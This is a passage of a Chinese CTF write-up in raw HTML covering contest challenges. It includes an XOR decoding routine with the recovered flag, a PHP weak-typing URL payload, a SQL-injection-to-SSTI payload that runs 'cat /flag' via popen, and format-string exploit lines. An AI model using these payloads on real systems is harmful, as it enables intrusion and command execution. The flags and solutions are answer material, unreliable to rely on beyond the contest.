&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;nCount&nbsp;=&nbsp;0;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;for(DWORD&nbsp;dw&nbsp;=0;dw&lt;dwSize;dw++)
&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(nCount&nbsp;==&nbsp;50)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nCount=0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pbData[dw]^=bArray[nCount];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nCount++;
&nbsp;&nbsp;&nbsp;&nbsp;}
}


BYTE&nbsp;bCmp[]&nbsp;=&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;0xE8,0x90,0x24,0xE6,0x0A,0xE3,0xF7,0xA8,0x09,0xC0,0x35,0x74,0x26,0x4D,0xA0,0x2D,&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;0xD6,0x1A,0x5A,0x5C,0x16,0x2D,0xF0,0x46,0x44,0x10,0x5F,0x83,0x5B,0xBE,0x86,0xAC,
};

dec_xor1((PBYTE)bCmp,64);
MakeArray(56,(PBYTE)bCmp,sizeof(bCmp));</pre><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">得到flag:<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">SMc_AnD_jUnk_C0de_1s_s0_fuunn~!</code></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">本题需要带壳分析，不要去脱壳，或者dump shellcode里面打包的dll，修复下pe头即可。然后分析dll，dll里面的花指令去掉会明朗很多。</p><h3 id="toc_88" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">3.babyLoginPlus</h3><h4 id="toc_89" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">babyLogin 新品发布会。『babyLogin Plus』哪一面，都是亮(汇)点(编)。</p><h4 id="toc_90" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">逆向分析</p><h4 id="toc_91" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">此题为简易VM，只需关注运算操作相关的指令处理方法。<br style="box-sizing: border-box;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415554780785.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><br style="box-sizing: border-box;">通过动态调试，能够发现算法很短，记录下第一个字符的处理方法调用顺序就可以确定算法流程，对密文进行逆运算即可得到此题 Flag。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415818254821287.png" title="image.png" alt="image.png" width="714" height="547" style="width: 714px; height: 547px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415818563584226.png" title="image.png" alt="image.png" width="697" height="414" style="width: 697px; height: 414px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415554912359.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415554954670.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415818817941404.png" title="image.png" alt="image.png" width="699" height="154" style="width: 699px; height: 154px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">由于篇幅问题无法在此做详细介绍，如有疑问可加入 第七届山东省网络安全大赛(415964984) QQ群，群内咨询管理员。</p><h2 id="toc_92" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.225; font-size: 1.75em; position: relative; padding-bottom: 0.3em; border-bottom: 1px solid rgb(238, 238, 238); caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">Web</h2><h3 id="toc_93" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">web1 - babyweb</h3><h4 id="toc_94" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">复现地址：<a href="http://47.105.148.65:29001/" style="box-sizing: border-box; overflow-wrap: break-word; word-break: break-all; color: rgb(65, 131, 196); text-decoration-line: none;">http://47.105.148.65:29001</a></p><h4 id="toc_95" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">http伪造IP，篡改cookie</p><h4 id="toc_96" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">签到Web题。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415819229423460.png" title="image.png" alt="image.png" width="718" height="217" style="width: 718px; height: 217px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414269782744.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><h3 id="toc_97" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">web2 - babyweb2</h3><h4 id="toc_98" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">复现地址：<a href="http://47.105.148.65:29002/" style="box-sizing: border-box; overflow-wrap: break-word; word-break: break-all; color: rgb(65, 131, 196); text-decoration-line: none;">http://47.105.148.65:29002</a></p><h4 id="toc_99" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">变量覆盖 + php弱类型 + 条件竞争</p><h4 id="toc_100" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">第一步：<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">http://47.105.148.65:29001/index.php?id=key[99]=QNKCDZO</code></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">第二步：最简单的方法，burp Intruder开两个任务，一个上传，一个访问即可。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414279985423.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415819567541090.png" title="image.png" alt="image.png" width="682" height="403" style="width: 682px; height: 403px;"></p><h3 id="toc_101" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">web3 - easy_flask</h3><h4 id="toc_102" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">复现地址：<a href="http://47.105.148.65:29003/" style="box-sizing: border-box; overflow-wrap: break-word; word-break: break-all; color: rgb(65, 131, 196); text-decoration-line: none;">http://47.105.148.65:29003</a></p><h4 id="toc_103" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">SQLi + SSTI</p><h4 id="toc_104" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目提供了Add a Comment和Search Comment两个功能</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">首先尝试SSTI。提交如下内容：<br style="box-sizing: border-box;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414281573213.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415819844305067.png" title="image.png" alt="image.png" width="649" height="367" style="width: 649px; height: 367px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">搜索用户名，得到结果：<br style="box-sizing: border-box;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414282083772.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415820106979689.png" title="image.png" alt="image.png" width="696" height="338" style="width: 696px; height: 338px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">存在ssti，但是Add a Comment中username和comment两个参数限制了字符长度，最多提交10个字符，没法正常运用ssti。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">测试search功能，username参数存在sql注入</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415820373709058.png" title="image.png" alt="image.png" width="687" height="238" style="width: 687px; height: 238px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414283554170.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">有两个思路可以继续做。<br style="box-sizing: border-box;">思路一：将ssti的payload进行切片，存入数据库，然后使用注入语句进行拼接，触发ssti。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">思路二：使用<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">union select</code>，将ssti的payload直接显示，触发ssti。<br style="box-sizing: border-box;">payload：<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">username=jzxt' union select 1,2,"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('cat /flag').read()}}" -- -</code></p><h2 id="toc_105" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.225; font-size: 1.75em; position: relative; padding-bottom: 0.3em; border-bottom: 1px solid rgb(238, 238, 238); caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">Pwn</h2><h3 id="toc_106" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">Pwn1 - repeater</h3><h4 id="toc_107" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">复现地址：<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">nc 47.105.148.65 9999</code></p><h4 id="toc_108" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">格式化字符串</p><h4 id="toc_109" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">此题为简单的格式化字符串漏洞，首先总览分析一下程序，循环受<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">totalcount</code><span class="Apple-converted-space">&nbsp;</span>次数限制，初始值为 1。</p><p style="white-space: normal;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415820756596815.png" title="image.png" alt="image.png" width="704" height="358" style="width: 704px; height: 358px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415552876774.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><br style="box-sizing: border-box;">程序提供了<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">getFlag</code><span class="Apple-converted-space">&nbsp;</span>方法，但是需要变量<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">number</code>为<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">0x2018</code><span class="Apple-converted-space">&nbsp;</span>才会执行命令。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415821019845473.png" title="image.png" alt="image.png" width="270" height="194" style="width: 270px; height: 194px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415552980093.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><br style="box-sizing: border-box;">接下来思路就很清晰了，首先改写<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">totalcount</code><span class="Apple-converted-space">&nbsp;</span>变量，使得循环执行更多次。<br></p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">payload&nbsp;=&nbsp;fmtstr_payload(4,{0x0804A064:0x3})
p.sendline(payload)</pre><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">然后改写<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">number</code><span class="Apple-converted-space">&nbsp;</span>为<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">0x2018</code>。</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">payload&nbsp;=&nbsp;fmtstr_payload(4,{0x0804A060:0x2018})
